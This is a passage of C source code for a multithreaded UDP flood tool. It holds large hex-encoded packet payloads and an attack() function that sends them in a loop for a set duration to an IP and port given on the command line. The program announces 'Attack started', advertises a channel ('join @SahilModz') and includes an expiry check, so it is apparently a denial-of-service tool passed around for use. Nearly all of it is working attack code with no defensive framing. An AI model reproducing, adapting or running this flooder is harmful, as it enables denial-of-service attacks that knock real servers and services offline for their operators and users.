"xDD\xC9\x16\x7D\xB0\x85\x57\x93\x32\x6F\x5F\x2D\xE7\x80\x1F\xEB\x84\xC1\xBA\xEF\x02\x7B\xB1\x26\x3C\xCB\x9F\x24\x62\xBD\x36\x24\x74\x3B\x67\x06\x7C\x7C\xA5\xB1\x3B\x37\x11\xF4\x5A\x12\x73\xEB\x56\x23\x66\x16\xEE\x33\xB1\xEA\xBF\xF6\xF3\xD9\x2D\x83\xF7\xE3\x3A\x2A\xDF\x09\x33\x6B\x30\xD0\x47\xFA\xDC\x1B\xF1\x6C\xF2\x84\x31\x0E\x93\x98\x7D\x22\xB2\x14\x16\xEA\x1D\x20\x2F\xCA\x1C\x75\x57\x5C\x77\x8A\xAD\x24\x8F\x9D\xC5\x59\x17\x79\x46\xC0\x07\xA1\xD6\x1F\xA1\x05\x7B\x06\xFF\xAE\x51\xA9\x6B\x31\xA9\xDE\x43\x50\x62\xCC\xED\x06\x1E\x78\xAC\xB9\xCD\x36\xFD\x08\xB7\x87\xB2\xCC\xFE\x3E\x08\x2A\x8E\x07\xB5\x7D\x03\x13\x19\x42\xF3\x57\x2A\xC7\xCD\x2F\x25\xF3\x7E\xD0\xC6\x91\x15\xBE\xEA\xE9\xB0\x9C\xF9\x1E\x38\xEE\x02\x48\xE3\x78\xD9\xBB\x4D\x06\xEC\x2A\xF5\x6E\x3E\x4C\x16\xA7\x71\xE5\x3F\x4E\x92\x99\xC5\xFB\xEC\x16\x61\x9D\xAE\xF8\xEC\xEC\xE9\x50\x9A\xCD\x19\x5D\xA3\x2A\x05\x1F\x7C\x78\x5D\xCE\x92\x71\xEE\xFB\xA4\x73\x41\x2E\x74\xF0\x98\x2A\x9B\x3A\xBD\xD6\x38\x40\x96\xA2\x6F\xCD\x46\xB2\x87\x4B\x41\xFC\x47\x56\x62\xFA\xAE\xDC\x94\x4E\xE7\xC6\xC3\x8B\xC4\x8B\xB9\x89\x3D\x8E\x87\xF8\x9A\x2E\x88\xE6\x12\x7C\x8F\xDA\xCD\x59\x83\x38\x6C\x2E\x2D\x66\x36\xFC\xF2\xFF\x30\x7E\x82\x45\x09\x7B\x1B\x84\x09\x6E\x91\x5A\xB8\x0B\xC7\x3F\x72\x02\xAE\xD0\x42\x5D\xCD\x64\x27\x86\x37\x7A\x92\xA7\xA3\x64\x24\x31\xDE\x64\x17\xF8\xE4\x17\x4D\xB2\x63\xC7\xCD\xB6\x72\x25\x19\x11\xD1\x28\x63\xB3\xFD\xB3\x65\xD7\xFA\x20\x30\x99\xB4\x76\xF1\x5E\xE8\xA3\x45\x68\xB0\xDD\x23\x68\x88\x00\x49\xA7\x27\xE2\x8C\x56\x2D\xC6\x1B\xCF\xAA\x2C\x56\x6C\xE3\x67\x51\x07\x0D\x88\x38\x94\xA3\x6C\xE5\xAA\x6F\xB0\xFB\xED\xF3\x68\x5F\xF1\x48\xD1\x65\xF6\xE1\x9B\xD6\xC8\xEA\x2B\x56\x71\xC1\x6C\x03\x0A\x92\x1D\xAB\xF6\xAE\x04\xB8\x06\xC6\xE9\xBD\x68\x46\x75\x13\x62\xAA\xA8\x2C\x33\xCA\xFA\x74\x13\xE7\xE6\x6C\x80\xFB\xAE\x3E\xD9\xAB\x6B\x60\x1F\x89\xC3\x05\x00\x52\x97\x5B\x28\x69\xF3\x73\x79\x91\x8F\x25\xCA\x1F\x73\xEE\x8A\x2D\x24\x57\xB8\x50\x33\x1B\x8E\x5D\xB1\x12\xCE\x94\xA5\xD3\x79\xD5\x03\xA8\x10\xE4\xC7\xE4\x4E\x50\x07\xA3\xB7\xFD\x7F\x71\x84\x0B\xEC\x8E\x8B\x14\x9D\x14\xA8\x64\xFB\x35\xAA\x7A\x4E\xAB\x21\xD3\x99\xCE\xA0\x39\xA3\xBA\x81\xDB\x13\x40\x0C\x21\xE9\x19\xA4\x17\x56\xD7\x7A\xA6\xAF\xD3\xB8\xEF\x54\x96\xD3\xA9\xF6\x4E\xDC\xBD\xC9\x3A\x23\x35\x4F\x43\xA8\x9B\x3C\x82\xF2\x9A\x13\x73"

"\x26\x9D\x58\x8F\x81\x2A\x6E\x98\x83\xCD\x9F\x91\x6F\xF4\xB1\x8B\xB1\x0E\xA5\x3D\xA3\xA8\xA5\x0C\x04\x7D\xC1\x11\xA2\xE4\x52\x4C\x42\x68\x93\x1A\x0A\x9C\xC6\x8F\xDF\x5A\x69\x3B\xB0\x60\x27\x13\xDE\x43\xA0\xD6\x6D\x8E\x58\x30\x80\x58\x71\xBA\x1E\x02\xDA\x0F\x7A\x77\xAB\x7A\x25\xBD\x3F\xDD\x71\x5F\x8D\xCE\x74\x05\x07\xBC\xED\x96\xE7\x1F\x58\x62\x0A\x00\x7E\x18\x8D\x05\x53\x26\xDF\x7F\x3C\x9D\x79\xC3\x4B\x31\xA6\x97\x52\x37\x70\x5B\xC3\x2A\x5B\xD7\x27\x52\x76\x46\xEE\xDD\xCF\xA2\xEA\x02\x7E\xC7\xEF\x44\xF9\xC0\xCF\xEB\xAD\xA6\xC9\xFC\x68\x9B\x2F\x88\x0F\xC9\x97\x37\x22\x22\xB3\xAA\xE1\x7A\xC0\x7C\x9A\x55\x10\xDF\x03\x49\x81\xDE\x81\x38\x70\x10\x5D\xBD\x48\x58\xBC\xE2\xAD\x49\x2F\xC7\x37\xB8\x6F\xBE\xAE\x49\xF4\x06\x54\x41\x72\xC5\x88\x9E\xF8\x8C\x6C\x76\xEF\xEE\x36\x1F\xF5\x93\x82\xB0\x2B\x6F\x8D\x3F\xA3\x4F\xC8\xF4\x3D\x7C\x6E\xD1\xD9\x0C\xD9\x26\xEC\x90\x81\x76\xFC\x2C\x91\x05\x73\x15\x4E\xAF\x20\xAF\x3F\x9A\xE9\x9B\xEB\xDC\x99\xD2\x9F\x64\x96\xB8\x98\x0F\x01\xCE\x07\xD5\x8E\x9B\xCE\x1E\x63\x70\x74\x82\xB6\x8D\x9A\xDB\x24\x5A\xDA\xA2\xC5\x50\xC2\x9E\xA3\x71\xAE\x21\xE2\x54\xAA\x2C\x4A\x0C\xB9\x09\x79\x41\x8E\x9E\x5C\xE3\x83\x2C\x8D\xCB\x63\xB6\x2F\xEE\x9B\x89\x1E\xA5\x81\xD5\x6E\x9C\x1F\x25\x46\x4D\xD9\xA4\x46\x41\x32\xE8\xDF\x34\x6D\x21\xCF\x81\x12\x7F\x3B\xB7\x20\x71\xCF\x88\xEE\xF0\x0F\x1A\xFE\x82\x42\x3B\xEC\xAF\x34\xEC\xA9\x12\x2B\x21\x5C\x66\xA6\x9D\xB8\xFC\xA6\x12\x45\x7E\xF0\x96\xEF\x10\xE0\xFB\xD2\x1C\xD4\x7A\x56\x6B\xDC\x27\x18\x11\xF6\x17\xEB\x32\x9F\xF2\xF2\x76\x99\x0A\xEE\x06\x15\x1E\xDE\xA8\x71\xED\xA9\x4D\x27\x46\xB8\x84\x3A\x88\x92\x07\xC2\x78\x09\xE9\x4A\x55\x1E\x57\x80\x65\x95\xA4\x3A\x11\x3F\xBE\x1C\x02\xFE\x13\xB6\xD0\xBB\x72\x75\xEE\x67\x02\x20\x9B\x6E\x54\x3E\x29\x98\x13\x85\x35\x18\x68\xE6\x31\x6B\xA1\x49\x88\x1C\xA7\xCE\x5D\xC5\x07\x76\xAC\x3D\xB6\x77\xC4\x41\x17\xAB\x99\x06\x2D\xB5\x64\x37\x5C\x6B\x49\x8F\x08\xCF\xF5\x0D\xAD\x25\x30\xBF\x1B\xB0\xE0\x3F\x8B\x6E\xA7\xDD\x8D\xCE\x95\x64\x40\x1B\x51\xDA\x2E\x23\xB3\xAE\x4D\x39\x89\x20\xAB\x0A\xC1\xDD\x34\x08\xD1\x32\x47\x1A\xA0\x2C\x8D\xAE\x57\xF6\xC9\x08\xD4\xBA\x84\xAF"

"\x98\x50\x77\x57\xB1\x59\xF8\xBA\xC2\xED\x04\xB7\x7C\x5A\x62\xB9\x4B\x2A\xFD\xBD\xC6\xA9\xB5\xF3\xED\xC9\x24\xB4\x56\xEB\x8B\x79\x82\xA7\x65\x2E\x14\x7C\x56\xCB\x35\x01\x6B\xE4\x46\x84\x58\x86\x32\xB6\x44\x8F\x1D\xD0\xBA\xF8\x90\x15\x4D\x9A\xB1\x6B\x2C\x29\x28\xA3\x8C\x4E\x7B\x27\xBC\xAE\x07\xF8\x05\x8B\x82\x17\x97\xB8\x43\x85\x11\x61\x95\x03\xA2\xC4\x27\x3F\x72\x17\xA9\x28\x34\xB6\xD6\x2A\xA4\x40\x0D\xAD\x78\xE2\x66\x91\xA0\xFC\x95\x12\xAD\xD4\xEB\x8C\xC0\x60\x64\x53\xAC\xB6\xDD\xF7\x9A\xF9\xF1\x27\x87\x43\x95\x88\xB2\x52\x07\x5F\x20\x2F\x69\xDB\x4C\x3F\xF6\x19\x1E\xB2\xAF\x81\xC2\xA8\x82\x68\xA9\x49\x1A\xE3\x9D\x2A\x13\x71\x70\x41\x89\xD5\x7F\x0F\x48\xBC\x5A\x9E\x45\x53\x39\x08\xC5\xC7\x8E\x23\x19\x48\xC2\xC0\x4E\x47\x7C\xA8\xD1\x9F\x75\x6A\x66\xDE\x69\xA9\x8A\x4B\x44\x68\xCA\x4D\x78\xD3\xA4\x0A\x5A\xE7\x66\x67\xAD\xBA\xF1\xF4\x82\x8E\xEB\xA4\xDA\xD7\x09\xE0\xCA\x58\x2A\x67\x6A\xEE\x35\x10\x3F\x8F\x4B\x21\x6C\xEF\xE2\xE0\xD2\x31\x5F\x7A\x62\xAA\xC2\xE8\x79\xA5\x33\x15\x3F\xD3\xD1\x03\xBE\x97\xE4\x5C\x30\x6C\x65\xE6\x01\x67\x66\x25\x77\x2D\xC3\x35\x72\xBF\x9D\x9B\xC7\xB6\xAE\xC6\x66\x19\x10\x2C\x8A\xA6\xA2\x25\xD7\x6A\x83\xB0\xDF\xD0\x32\x32\x2C\x1D\x66\x5D\x27\x45\x64\x15\x5C\xA5\xCF\x0A\xCC\xB8\x23\x37\x4D\x33\xF4\x88\x32\x35\x36\x53\xBE\xD9\x4B\x79\x15\xDE\xC4\xDC\x37\xF8\x52\x5C\x55\xF5\xE9\xCE\x8B\x7C\xAD\x2E\x93\xAB\x89\xE4\xC9\xB8\x98\x2C\xA2\x71\x0B\x0D\x68\x78\x45\x2B\x29\x48\x70\xDD\x24\xEC\xB4\x41\x6C\xF8\xC7\xBB\xB2\xB8\xAC\xE8\x7B\x4C\x9F\xE6\xD4\xF4\x21\xC5\x87\xC9\xEE\xFB\xDE\x38\x40\xF4\xF8\xD9\x81\xFF\x5A\x76\xDB\xE1\xB2\xE2\x79\x95\xB5\xE2\x5F\x25\x0F\xA1\x62\x92\x9C\xEE\xA6\x82\xFF\x8C\x86\x95\xC4\xB7\x83\x6B\x85\x0A\x6F\x2A\xB3\xCC\xA9\x3B\x4B\xC5\x35\x80\x94\x7E\x77\xC3\x25\x78\x9B\x43\x2D\xC7\xAC\x1C\x04\xB7\xB9\x64\x93\x94\x28\x32\xFE\x25\x29\x6C\x45\x78\x3E\x36\xDD\x60\x2C\xE3\xC5\x0E\x6F\xB0\x1D\xBF\x6E\xA1\x17\x94\x0F\xC4\x22\x92\x90\x69\x7A\xC9\x0C\xFA\xD9\x74\xC6\xE6\xC1\xE0\x8B\x2E\x58\x7D\xCC\x43\x76\x00\x69\x99\x93\x31\x65\x32\xB7\x82\x08\x53\x11\x9F\xFA\x5C\xB2\x77\x11\x75\xB8\x5B\xBD\xEB\xD4\xAA\xF3\x33\x03\x64\x0A\xC3\xC8\x12\xBA\x18\x33\x9C\x00\x6E\x5A\xE0\x83\x6B\x9B\x61\x8C\xB7\x03\x9A\x7E\x60\xF4\xA4\xF6\xA5\x84\x29\x00\x4C\x41\x5A\x50\xEB\x01\x47\xDE\x57\x57\x48\xBA\xD0\x3A\x62\xAD\xE3\xA0\x86\x82\x77\xC1\xAA\xBB\xC0\x70\x43\x18\x5A\x01\xB2\x48\x68\xC6\x42\xE8\x65\x48\xC4\xAF\x5F\xFE\x28\xA6\xE5\x57\xAC\x53\x3B\xE8\x89\xE2\x0C\x14\x9D\x2F\x04\xDA\x43\xF4\x45\x64\x0E\x69\xB3\xDB\x12\x81\xC7\x2C\x66\x2C\xEE\xBB\x9F\x7C\x09\x12\x39\xA4\xFC\x8B\x49\xAF\x95\xA6\xE8\x98\xAA"

        };

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Send packets for the specified duration
    time_t endtime = time(NULL) + data->time;
    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0,
                      (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Check if the file has expired
    if (check_expiry()) {
        exit(1);
    }

    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    // Start attack threads
    for (int i = 0; i < threads; i++) {
        struct thread_data *thread_data_copy = malloc(sizeof(struct thread_data));
        memcpy(thread_data_copy, &data, sizeof(struct thread_data));

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)thread_data_copy) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    // Join all attack threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished, join @SahilModz\n");
    return 0;
}